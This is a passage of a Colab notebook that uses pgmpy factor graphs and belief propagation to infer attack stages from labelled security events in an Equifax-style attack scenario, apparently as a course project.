      "\u001b[K     |█████▉                          | 61kB 2.5MB/s eta 0:00:01\r",
      "\u001b[K     |██████▊                         | 71kB 2.9MB/s eta 0:00:01\r",
      "\u001b[K     |███████▊                        | 81kB 3.3MB/s eta 0:00:01\r",
      "\u001b[K     |████████▊                       | 92kB 3.7MB/s eta 0:00:01\r",
      "\u001b[K     |█████████▋                      | 102kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |██████████▋                     | 112kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |███████████▋                    | 122kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |████████████▌                   | 133kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |█████████████▌                  | 143kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |██████████████▌                 | 153kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |███████████████▌                | 163kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |████████████████▍               | 174kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |█████████████████▍              | 184kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |██████████████████▍             | 194kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |███████████████████▎            | 204kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |████████████████████▎           | 215kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |█████████████████████▎          | 225kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |██████████████████████▏         | 235kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |███████████████████████▏        | 245kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |████████████████████████▏       | 256kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |█████████████████████████       | 266kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |██████████████████████████      | 276kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |███████████████████████████     | 286kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |████████████████████████████    | 296kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |█████████████████████████████   | 307kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |██████████████████████████████  | 317kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |███████████████████████████████ | 327kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |███████████████████████████████▉| 337kB 2.8MB/s eta 0:00:01\r",
      "\u001b[K     |████████████████████████████████| 348kB 2.8MB/s \n",
      "\u001b[?25hRequirement already satisfied: torch in /usr/local/lib/python3.6/dist-packages (from pgmpy) (1.5.0+cu101)\n",
      "Requirement already satisfied: joblib in /usr/local/lib/python3.6/dist-packages (from pgmpy) (0.14.1)\n",
      "Requirement already satisfied: tqdm in /usr/local/lib/python3.6/dist-packages (from pgmpy) (4.38.0)\n",
      "Requirement already satisfied: scipy in /usr/local/lib/python3.6/dist-packages (from pgmpy) (1.4.1)\n",
      "Requirement already satisfied: pandas in /usr/local/lib/python3.6/dist-packages (from pgmpy) (1.0.3)\n",
      "Requirement already satisfied: statsmodels in /usr/local/lib/python3.6/dist-packages (from pgmpy) (0.10.2)\n",
      "Requirement already satisfied: numpy in /usr/local/lib/python3.6/dist-packages (from pgmpy) (1.18.3)\n",
      "Requirement already satisfied: networkx in /usr/local/lib/python3.6/dist-packages (from pgmpy) (2.4)\n",
      "Requirement already satisfied: pyparsing in /usr/local/lib/python3.6/dist-packages (from pgmpy) (2.4.7)\n",
      "Requirement already satisfied: future in /usr/local/lib/python3.6/dist-packages (from torch->pgmpy) (0.16.0)\n",
      "Requirement already satisfied: python-dateutil>=2.6.1 in /usr/local/lib/python3.6/dist-packages (from pandas->pgmpy) (2.8.1)\n",
      "Requirement already satisfied: pytz>=2017.2 in /usr/local/lib/python3.6/dist-packages (from pandas->pgmpy) (2018.9)\n",
      "Requirement already satisfied: patsy>=0.4.0 in /usr/local/lib/python3.6/dist-packages (from statsmodels->pgmpy) (0.5.1)\n",
      "Requirement already satisfied: decorator>=4.3.0 in /usr/local/lib/python3.6/dist-packages (from networkx->pgmpy) (4.4.2)\n",
      "Requirement already satisfied: six>=1.5 in /usr/local/lib/python3.6/dist-packages (from python-dateutil>=2.6.1->pandas->pgmpy) (1.12.0)\n",
      "Installing collected packages: pgmpy\n",
      "Successfully installed pgmpy-0.1.10\n"
     ]
    }
   ],
   "source": [
    "pip install pgmpy"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "VKstkixX0pVO"
   },
   "outputs": [],
   "source": [
    "import numpy as np\n",
    "import pandas as pd\n",
    "import pgmpy\n",
    "from pgmpy.factors.discrete import DiscreteFactor\n",
    "from pgmpy.models import FactorGraph\n",
    "from pgmpy.inference import BeliefPropagation"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "zbU6Kz7B0pVQ"
   },
   "source": [
    "## Introduction to Programming Factor Graphs"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "vlRj7XCgYsgb"
   },
   "source": [
    "#### Building the factor graph ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "YCEW2FqR0pVQ"
   },
   "outputs": [],
   "source": [
    "G = FactorGraph() \n",
    "f_1 = DiscreteFactor(['S1'], [2], [0.85,0.15])\n",
    "f_2 = DiscreteFactor(['S1', 'E1'], [2,2], [0.1,0.2,0, 0.5])\n",
    "\n",
    "G.add_nodes_from(['S1', 'E1'])  \n",
    "G.add_factors(f_1, f_2)     \n",
    "G.add_edges_from([('E1', f_2), ('S1', f_1)])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "V97bTCZpY6J1"
   },
   "source": [
    "#### Compute the marginal probability P(S1)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 155
    },
    "colab_type": "code",
    "executionInfo": {
     "elapsed": 458,
     "status": "ok",
     "timestamp": 1588205557482,
     "user": {
      "displayName": "Rishabh Gupta",
      "photoUrl": "",
      "userId": "18371313904054328717"
     },
     "user_tz": 300
    },
    "id": "UZifuvWa0pVS",
    "outputId": "264d18aa-e49c-4ba9-909d-e3cdc9fab968"
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Eliminating: E1: 100%|██████████| 1/1 [00:00<00:00, 121.24it/s]\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>P(S1)</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>S1</th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0.772727</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>0.227273</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "       P(S1)\n",
       "S1          \n",
       "0   0.772727\n",
       "1   0.227273"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "bp = BeliefPropagation(G)\n",
    "margin = bp.query(variables = ['S1'])\n",
    "df_margin_S1 = pd.DataFrame({'S1': ['0','1'],\n",
    "                             'P(S1)': margin.values/sum(margin.values)})\n",
    "\n",
    "df_margin_S1.set_index('S1', inplace=True)\n",
    "df_margin_S1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "A6DxhiNVa6Ti"
   },
   "source": [
    "#### Suppose we have already observed the event E1=1, compute the probability P(S1)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 155
    },
    "colab_type": "code",
    "executionInfo": {
     "elapsed": 371,
     "status": "ok",
     "timestamp": 1588205576600,
     "user": {
      "displayName": "Rishabh Gupta",
      "photoUrl": "",
      "userId": "18371313904054328717"
     },
     "user_tz": 300
    },
    "id": "Lc5TUBF90pVW",
    "outputId": "6e3a0e8f-f7f0-4367-90a6-d84b31bca6e2"
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "0it [00:00, ?it/s]\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>P(S1|E1=1)</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>S1</th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0.693878</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>0.306122</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "    P(S1|E1=1)\n",
       "S1            \n",
       "0     0.693878\n",
       "1     0.306122"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "margin_e1 = bp.query(variables = ['S1'], evidence={'E1':1})\n",
    "\n",
    "df_margin_e1 = pd.DataFrame({'S1': ['0','1'],\n",
    "                             'P(S1|E1=1)': margin_e1.values/sum(margin_e1.values)})\n",
    "\n",
    "df_margin_e1.set_index('S1', inplace=True)\n",
    "df_margin_e1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "uzqusr-ibp7I"
   },
   "source": [
    "#### Most probable state of S1 when observing E1=1."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "Km0_WFdtbr7z"
   },
   "source": [
    "**S1 = 0 is the most probable state when observing E1 = 1**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "4jJTZfBH0pVY"
   },
   "source": [
    "## Task 3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 125
    },
    "colab_type": "code",
    "executionInfo": {
     "elapsed": 41285,
     "status": "ok",
     "timestamp": 1588205745605,
     "user": {
      "displayName": "Rishabh Gupta",
      "photoUrl": "",
      "userId": "18371313904054328717"
     },
     "user_tz": 300
    },
    "id": "ek_r84Xu01jy",
    "outputId": "bbb46ef0-7463-4045-e8e6-f9f356c6021f"
   },
   "outputs": [],
   "source": [
    "try:\n",
    "  from google.colab import drive\n",
    "  import os\n",
    "  IN_COLAB = True\n",
    "except:\n",
    "  IN_COLAB = False\n",
    "if IN_COLAB:\n",
    "  drive.mount('/content/drive')\n",
    "  os.chdir(\"/content/drive/My Drive/Shared/CS 498 Projects/Mini Projects/MP-3\")\n",
    "  os.listdir(\"/content/drive/My Drive/Shared/CS 498 Projects/Mini Projects/MP-3\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "M8JXrhJF0pVZ"
   },
   "outputs": [],
   "source": [
    "ATTACK_EVENTS_MAP = {\n",
    "    'Scan':1,\n",
    "    'Login':2,\n",
    "    'Sensitive_URI':3,\n",
    "    'New_Kernel_Module':4,\n",
    "    'DNS_Tunneling':5\n",
    "}\n",
    "ATTACK_STATES_MAP = {\n",
    "    'benign': 1,\n",
    "    'discovery': 2,\n",
    "    'access': 3,\n",
    "    'lateral_movement': 4,\n",
    "    'privilege_escalation': 5,\n",
    "    'persistence': 6,\n",
    "    'defense_evasion': 7,\n",
    "    'collection': 8,\n",
    "    'exfiltration': 9,\n",
    "    'command_control': 10,\n",
    "    'execution': 11\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "jiq4dvqe0pVb"
   },
   "source": [
    "### Inference for a factor graph of the Equifax attack scenario"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 34
    },
    "colab_type": "code",
    "executionInfo": {
     "elapsed": 41449,
     "status": "ok",
     "timestamp": 1588205745791,
     "user": {
      "displayName": "Rishabh Gupta",
      "photoUrl": "",
      "userId": "18371313904054328717"
     },
     "user_tz": 300
    },
    "id": "coygwWJB0pVb",
    "outputId": "f831a4de-189b-494c-86a8-0a0d744f1935"
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'Login ', 'New_Kernel_Module ', 'Sensitive_URI ', 'Scan ', 'DNS_Tunneling '} {'persistence', 'exfiltration ', 'privilege_escalation', 'discovery', 'benign'}\n"
     ]
    }
   ],
   "source": [
    "# Reading Events and States in event_review.txt file\n",
    "event_review = open('event_review.txt', 'r') \n",
    "Lines = event_review.readlines() \n",
    "events = []\n",
    "states = []\n",
    "for line in Lines: \n",
    "    event, state = [split for split in line.split('/') if split != '']\n",
    "    event = event[7:]\n",
    "    state = state[21:-1]\n",
    "    events.append(event)\n",
    "    states.append(state)\n",
    "print(set(events), set(states))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 227
    },
    "colab_type": "code",
    "executionInfo": {
     "elapsed": 41437,
     "status": "ok",
     "timestamp": 1588205745791,
     "user": {
      "displayName": "Rishabh Gupta",
      "photoUrl": "",
      "userId": "18371313904054328717"
     },
     "user_tz": 300
    },
    "id": "-BJXr6vu0pVd",
    "outputId": "0f6ba4c3-37a2-4a50-a59e-11fa6baabd6d"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th>State</th>\n",
       "      <th>benign</th>\n",
       "      <th>discovery</th>\n",
       "      <th>exfiltration</th>\n",
       "      <th>persistence</th>\n",
       "      <th>privilege_escalation</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Event</th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>DNS_Tunneling</th>\n",
       "      <td>0.020000</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.98</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Login</th>\n",
       "      <td>1.000000</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>New_Kernel_Module</th>\n",
       "      <td>0.875000</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.125</td>\n",
       "      <td>0.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Scan</th>\n",
       "      <td>0.936000</td>\n",
       "      <td>0.064</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Sensitive_URI</th>\n",
       "      <td>0.553333</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.446667</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "State                 benign  discovery  exfiltration   persistence  \\\n",
       "Event                                                                 \n",
       "DNS_Tunneling       0.020000      0.000           0.98        0.000   \n",
       "Login               1.000000      0.000           0.00        0.000   \n",
       "New_Kernel_Module   0.875000      0.000           0.00        0.125   \n",
       "Scan                0.936000      0.064           0.00        0.000   \n",
       "Sensitive_URI       0.553333      0.000           0.00        0.000   \n",
       "\n",
       "State               privilege_escalation  \n",
       "Event                                     \n",
       "DNS_Tunneling                   0.000000  \n",
       "Login                           0.000000  \n",
       "New_Kernel_Module               0.000000  \n",
       "Scan                            0.000000  \n",
       "Sensitive_URI                   0.446667  "
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Probability of state given events\n",
    "event_states_df = pd.DataFrame({'Event': events, 'State' : states})\n",
    "event_states_df = event_states_df.pivot_table(index = ['Event'], columns = ['State'], values = 'State', aggfunc=len, fill_value=0)\n",
    "event_states_df = event_states_df.div(event_states_df.sum(axis=1), axis=0)\n",
    "event_states_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 107
    },
    "colab_type": "code",
    "executionInfo": {
     "elapsed": 743,
     "status": "ok",
     "timestamp": 1588207468614,
     "user": {
      "displayName": "Rishabh Gupta",
      "photoUrl": "",
      "userId": "18371313904054328717"
     },
     "user_tz": 300
    },
    "id": "FCJCdX3L0pVf",
    "outputId": "0f5fe925-4154-4005-830d-8e0c9030cc4a"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Most Common Event Sequence</th>\n",
       "      <th>Attack States</th>\n",
       "      <th>Probability</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Factor Function</th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>c</th>\n",
       "      <td>Scan, Sensitive_URI, New_Kernel_Module</td>\n",
       "      <td>persistence</td>\n",
       "      <td>0.07148</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                             Most Common Event Sequence Attack States  \\\n",
       "Factor Function                                                         \n",
       "c                Scan, Sensitive_URI, New_Kernel_Module   persistence   \n",
       "\n",
       "                 Probability  \n",
       "Factor Function               \n",
       "c                    0.07148  "
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Sliding Window Function Definition\n",
    "def sliding_window(list, window_size = 3):\n",
    "    sliding_window_list = []\n",
    "    if len(list)>= window_size:\n",
    "        for i in range(len(list)-window_size+1):\n",
    "            sliding_window_list.append(list[i:i + window_size])\n",
    "        return sliding_window_list\n",
    "    else:\n",
    "        raise Exception(\"Window size found more than length of the list\")\n",
    "\n",
    "# Reading attack sequences from attack_sequences.txt file\n",
    "attack_sequences = open('attack_sequences.txt', 'r') \n",
    "Lines = attack_sequences.readlines() \n",
    "\n",
    "# Storing all the 3 window size sequences from each line\n",
    "sliding_sequence = []\n",
    "for line in Lines:\n",
    "    for seq  in sliding_window(line.split()):\n",
    "        sliding_sequence.append(seq)\n",
    "\n",
    "# Counting most occuring 3 window size sequence and its Probability \n",
    "count = []\n",
    "for i in range(len(sliding_sequence)):\n",
    "    count.append(sliding_sequence.count(sliding_sequence[i]))\n",
    "seq_c = sliding_sequence[count.index(max(count))]\n",
    "Prob_c = max(count)/2798\n",
    "df_c = pd.DataFrame({'Most Common Event Sequence': [', '.join(seq_c)],\n",
    "                     'Factor Function': ['c'],\n",
    "                     'Attack States': ['persistence'],\n",
    "                     'Probability': [Prob_c]})\n",
    "df_c.set_index('Factor Function', inplace=True)\n",
    "df_c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 107
    },
    "colab_type": "code",
    "executionInfo": {
     "elapsed": 863,
     "status": "ok",
     "timestamp": 1588207468750,
     "user": {
      "displayName": "Rishabh Gupta",
      "photoUrl": "",
      "userId": "18371313904054328717"
     },
     "user_tz": 300
    },
    "id": "2MRwQvlg0pVh",
    "outputId": "ed4b8d60-b186-4c97-e45e-29d16a1a2bea"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Most Common Event Sequence</th>\n",
       "      <th>Attack States</th>\n",
       "      <th>Probability</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Factor Function</th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>r</th>\n",
       "      <td>Sensitive_URI, Sensitive_URI, Sensitive_URI</td>\n",
       "      <td>privilege escalation</td>\n",
       "      <td>0.066476</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                  Most Common Event Sequence  \\\n",
       "Factor Function                                                \n",
       "r                Sensitive_URI, Sensitive_URI, Sensitive_URI   \n",
       "\n",
       "                        Attack States  Probability  \n",
       "Factor Function                                     \n",
       "r                privilege escalation     0.066476  "
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Most repetitive sequence of 3 window size and its probability\n",
    "repetitive=[]\n",
    "count_repetitive=[]\n",
    "for seq in sliding_sequence:\n",
    "    if seq[0] == seq[1] == seq[2]:\n",
    "        repetitive.append(seq)\n",
    "for rep in repetitive:\n",
    "    count_repetitive.append(repetitive.count(rep))\n",
    "seq_r = repetitive[count_repetitive.index(max(count_repetitive))]\n",
    "Prob_r = max(count_repetitive)/len(sliding_sequence)\n",
    "df_r = pd.DataFrame({'Most Common Event Sequence': [', '.join(seq_r)],\n",
    "                     'Factor Function': ['r'],\n",
    "                     'Attack States': ['privilege escalation'],\n",
    "                     'Probability': [Prob_r]})\n",
    "df_r.set_index('Factor Function', inplace=True)\n",
    "df_r"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 141
    },
    "colab_type": "code",
    "executionInfo": {
     "elapsed": 1209,
     "status": "ok",
     "timestamp": 1588207469115,
     "user": {
      "displayName": "Rishabh Gupta",
      "photoUrl": "",
      "userId": "18371313904054328717"
     },
     "user_tz": 300
    },
    "id": "j7aQ_J9Y0pVl",
    "outputId": "a68eb878-ef93-4967-f883-0ece409d7308"
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Eliminating: E1: 100%|██████████| 1/1 [00:00<00:00, 454.13it/s]\n",
      "Eliminating: E1: 100%|██████████| 1/1 [00:00<00:00, 486.13it/s]\n",
      "Eliminating: E3: 100%|██████████| 1/1 [00:00<00:00, 224.47it/s]\n",
      "Eliminating: E3: 100%|██████████| 1/1 [00:00<00:00, 189.44it/s]\n",
      "Eliminating: E4: 100%|██████████| 1/1 [00:00<00:00, 136.17it/s]\n",
      "Eliminating: E4: 100%|██████████| 1/1 [00:00<00:00, 336.35it/s]\n",
      "Eliminating: E5: 100%|██████████| 3/3 [00:00<00:00, 51.04it/s]\n",
      "Eliminating: E4:   0%|          | 0/3 [00:00<?, ?it/s]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Eliminating: E5: 100%|██████████| 3/3 [00:00<00:00, 106.72it/s]\n",
      "Eliminating: E3: 100%|██████████| 3/3 [00:00<00:00, 102.28it/s]\n",
      "Eliminating: E3: 100%|██████████| 3/3 [00:00<00:00, 90.03it/s]\n"
     ]
    }
   ],
   "source": [
    "## Create FactorGraph object\n",
    "G_cr = FactorGraph()\n",
    "\n",
    "f_1 = DiscreteFactor(['S1','E1'],[11,1],[0.936, 0.064,0,0,0,0,0,0,0,0,0])\n",
    "f_2 = DiscreteFactor(['S2','E2'],[11,1],[1,0,0,0,0,0,0,0,0,0,0])\n",
    "f_3 = DiscreteFactor(['S3','E3'],[11,1],[0.553333,0,0,0,0.446667,0,0,0,0,0,0])\n",
    "f_4 = DiscreteFactor(['S4','E4'],[11,1],[0.553333,0,0,0,0.446667,0,0,0,0,0,0])\n",
    "f_5 = DiscreteFactor(['S5','E5'],[11,1],[0.553333,0,0,0,0.446667,0,0,0,0,0,0])\n",
    "f_6 = DiscreteFactor(['S6','E6'],[11,1],[0.875,0,0,0,0,0.125,0,0,0,0,0])\n",
    "f_7 = DiscreteFactor(['S7','E7'],[11,1],[0.020000,0,0,0,0,0,0,0,0.98,0,0])\n",
    "f_8 = DiscreteFactor(['S8','E8'],[11,1],[0.020000,0,0,0,0,0,0,0,0.98,0,0])\n",
    "f_9 = DiscreteFactor(['S9','E9'],[11,1],[0.020000,0,0,0,0,0,0,0,0.98,0,0])\n",
    "\n",
    "r = DiscreteFactor(['S5','E3','E4','E5'],[11,1,1,1],[0,0,0,0,0.0664,0,0,0,0,0,0])\n",
    "c = DiscreteFactor(['S6','E1','E3','E6'],[11,1,1,1],[0,0,0,0,0,0.0714,0,0,0,0,0]) \n",
    "\n",
    "G_cr.add_nodes_from(['E1','E3','E4','E5','E6','S1','S3','S4','S5','S6'])\n",
    "G_cr.add_factors(f_1,f_3,f_4,f_5,f_6,r,c)\n",
    "\n",
    "    \n",
    "G_cr.add_edges_from([('E1',f_1),('E3',f_3),('E4',f_4),('E5',f_5),('E6',f_6),\n",
    "                     ('S1',f_1),('S3',f_3),('S4',f_4),('S5',f_5),('S6',f_6),\n",
    "                     ('E1',r),('E3',r),('E6',r),('E3',c),('E4',c),('E5',c),\n",
    "                     ('S6',r),('S5',c)])\n",
    "\n",
    "\n",
    "Variables = ['S1', 'S3', 'S4', 'S5', 'S6']\n",
    "bp = BeliefPropagation(G_cr)\n",
    "margin = {}\n",
    "state_index = {}\n",
    "print('\\n')\n",
    "for var in Variables:\n",
    "  margin[var] = list(bp.query(variables = [var]).values/sum(bp.query(variables = [var]).values))\n",
    "  state_index[var] = margin[var].index(max(margin[var]))+1\n",
    "  #print(margin[var],'\\n',state_index[var])\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 34
    },
    "colab_type": "code",
    "executionInfo": {
     "elapsed": 1375,
     "status": "ok",
     "timestamp": 1588207469302,
     "user": {
      "displayName": "Rishabh Gupta",
      "photoUrl": "",
      "userId": "18371313904054328717"
     },
     "user_tz": 300
    },
    "id": "2Gnkt43i0pVm",
    "outputId": "400307ff-fb1e-4fb8-ad82-4fbf1f1a709d"
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Eliminating: E2: 100%|██████████| 1/1 [00:00<00:00, 490.28it/s]\n"
     ]
    }
   ],
   "source": [
    "G_2 = FactorGraph()\n",
    "\n",
    "G_2.add_nodes_from(['E2','S2'])\n",
    "G_2.add_factors(f_2)\n",
    "G_2.add_edges_from([('E2',f_2),('S2',f_2)])\n",
    "\n",
    "bp = BeliefPropagation(G_2)\n",
    "margin['S2'] = list(bp.query(variables = ['S2']).values)\n",
    "state_index['S2'] = margin['S2'].index(max(margin['S2']))+1\n",
    "# print(margin['S2'],'\\n',state_index['S2'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 34
    },
    "colab_type": "code",
    "executionInfo": {
     "elapsed": 1362,
     "status": "ok",
     "timestamp": 1588207469303,
     "user": {
      "displayName": "Rishabh Gupta",
      "photoUrl": "",
      "userId": "18371313904054328717"
     },
     "user_tz": 300
    },
    "id": "6SK1Danv0pVo",
    "outputId": "8679ee8c-1115-45ed-91db-e4a00ed49a53"
   },
